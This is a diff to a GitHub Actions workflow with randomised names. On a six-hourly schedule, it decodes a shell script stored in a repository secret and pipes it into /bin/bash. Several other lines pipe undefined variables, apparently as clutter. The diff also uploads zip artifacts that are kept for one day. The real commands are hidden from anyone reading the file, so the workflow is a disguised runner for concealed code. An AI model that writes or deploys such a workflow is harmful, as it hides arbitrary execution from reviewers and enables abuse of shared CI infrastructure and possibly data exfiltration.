@@ -1,21 +1,27 @@
 name: zhengsonglianghe
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '18 1/6 * * *'
-jobs:  # 5134
+    - cron: '33 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhengsonglianghe
         env:
-          xix5: ${{ secrets.xix5 }}
+          fb087: ${{ secrets.fb087 }}
         run: |
-          echo $xix5 | jq -r .kmrb2 | /bin/bash
-          echo $h4280 | jq -r .rtu74793 | /bin/bash
-          echo $b805 | jq -r .g264 | /bin/bash
-          echo $bnf0635 | jq -r .jhh632 | /bin/bash
-          echo $rh3189 | jq -r .t291 | /bin/bash
+          printf '%s' "$fb087" | jq -r .lbbr4754 | /bin/bash
+          echo $swwl2 | jq -r .cgz1970 | /bin/bash
+          echo $o405 | jq -r .g1785 | /bin/bash
+          printf '%s' "$vpeco7240" | jq -r .lck54 | /bin/bash
+          echo $lfxo2328 | jq -r .oj9 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: p95eMAcV
+          path: "*.zip"
+          retention-days: 1
